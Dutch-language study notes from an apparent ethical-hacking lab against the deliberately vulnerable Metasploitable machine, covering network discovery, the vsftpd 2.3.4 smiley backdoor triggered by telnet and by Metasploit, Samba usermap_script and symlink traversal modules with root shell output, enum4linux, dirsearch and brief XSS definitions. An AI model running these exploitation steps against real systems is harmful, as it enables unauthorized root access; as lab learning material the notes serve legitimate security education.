nmap en netdiscover zijn tools die worden gebruikt voor netwerkverkenning en -analyse.

nerdiscover -r 192.168.189.0/24

```bash
rlogin -l root 192.168.189.4
```

su en sudo su

winscp

ftp p 21

smily op het einde andere poort openenssh

```bash
telnet 192.168.198.4 21
^]
USER backdoored:)
PASS whatever
^]
nmap  -n -p 6200 192.168.189.4 6200/tcp open  backdoor

uname -a
```

reversed shell is een techniek waarbij een aanvaller een verbinding maakt van het slachtoffer naar de aanvaller, in plaats van andersom. Dit kan worden gebruikt om toegang te krijgen tot een systeem dat achter een firewall of NAT zit.

cvedetails.com is een website die informatie biedt over bekende kwetsbaarheden in software. Het is een handige bron voor beveiligingsprofessionals en ontwikkelaars om op de hoogte te blijven van de laatste beveiligingsproblemen en patches.

fail2ban is een software die wordt gebruikt om brute-force aanvallen te voorkomen door IP-adressen tijdelijk te blokkeren na een bepaald aantal mislukte inlogpogingen. Het is een effectieve manier om de beveiliging van een systeem te verbeteren en ongeautoriseerde toegang te voorkomen.

vps staat voor Virtual Private Server. Het is een virtuele machine die wordt gehost op een fysieke server en fungeert als een zelfstandige server met zijn eigen besturingssysteem, resources en netwerkverbinding. VPS'en worden vaak gebruikt voor webhosting, applicatiehosting en andere doeleinden waarbij een dedicated server nodig is, maar zonder de kosten van een volledige fysieke server.
Iaas

```bash
sudo msfdb run
search vsftpd
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS 192.168.189.4
run
ww ingeven maakt niet uut welke
run

whami
root
uname-a
Linux metasploitable 2.6.24-16-server #1 SMP Wed May
```

139/445 Sambaservice

```bash
smbclient -L 192.168.189.4
```

```
enum4linux -a 192.168.189.4 
```

```bash
msf auxiliary(admin/smb/samba_symlink_traversal)> show options
Module options (auxiliary/admin/smb/samba_symlink_traversal):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   RHOSTS

msf auxiliary(admin/smb/samba_symlink_traversal)> set RHOSTS 192.168.189.4
msf auxiliary(admin/smb/samba_symlink_traversal)> run
```

```bash
msf auxiliary(admin/smb/samba_symlink_traversal)> use exploit/multi/samba/usermap_script
msf exploit(multi/samba/usermap_script)> show options
Module options (exploit/multi/samba/usermap_script):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   RHOSTS

msf exploit(multi/samba/usermap_script)> set RHOSTS 192.168.189.4
msf exploit(multi/samba/usermap_script)> set LHOST je eigen device ip
msf exploit(multi/samba/usermap_script)> run

whoami
root
uname -a
Linux metasploitable 2.6.24-16-server #1 SMP Wed May 19 12:25:44 UTC 2004 i686 GNU/Linux
```

```
dirsearch -u 192.168.189.4 
```

404 not found ids blokeren naar een bepaalde url

mutillidae is een kwetsbare webapplicatie die wordt gebruikt voor beveiligingstests en het leren van webbeveiliging. Het bevat verschillende kwetsbaarheden die kunnen worden misbruikt door aanvallers, waardoor het een waardevolle tool is voor beveiligingsprofessionals en ontwikkelaars om hun vaardigheden te verbeteren en te begrijpen hoe aanvallen werken.

JAVA script vurnability

3 types of xss
1. Stored XSS: Hierbij wordt de kwaadaardige code opgeslagen op de server, bijvoorbeeld in een database, en wordt deze uitgevoerd wanneer een gebruiker de geïnfecteerde pagina bezoekt.
2. Reflected XSS: Hierbij wordt de kwaadaardige code direct in de URL of in een formulier ingevoerd en wordt deze uitgevoerd wanneer een gebruiker op een geïnfecteerde link klikt of een formulier indient.
3. DOM-based XSS: Hierbij wordt de kwaadaardige code uitgevoerd in de context van de Document Object Model (DOM) van een webpagina, vaak als gevolg van onveilige manipulatie van de DOM door JavaScript.

